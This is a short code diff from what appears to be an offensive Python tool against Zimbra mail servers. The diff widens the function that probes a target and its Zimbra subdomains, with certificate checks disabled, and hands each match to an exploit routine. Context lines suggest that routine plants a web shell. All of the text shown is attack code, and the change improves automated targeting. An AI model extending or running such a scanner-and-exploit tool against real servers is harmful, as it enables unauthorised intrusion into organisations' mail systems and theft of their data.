@@ -93,14 +93,14 @@ def exploit(session: requests.Session, url: str) -> None:
         warn('shell not found: %s', shell_url)
 
 
-def check_zimbra(session: requests.Session, base_url: str) -> None:
-    for subdomain in ZIMBRA_SUBDOMAINS:
+def check_zimbra(session: requests.Session, url: str) -> None:
+    urls = [url] + [url.replace('://', f'://{sub}.') for sub in ZIMBRA_SUBDOMAINS]
+    for u in urls:
         try:
-            url = base_url.replace('://', f'://{subdomain}.')
-            r = session.get(url, timeout=5.0, verify=False)
+            r = session.get(u, timeout=5.0, verify=False)
             if ZIMBRA_TITLE in r.text:
-                log('found: %s', url)
-                exploit(session, url)
+                log('found: %s', u)
+                exploit(session, u)
                 break
         except Exception as e:
             warn(e)
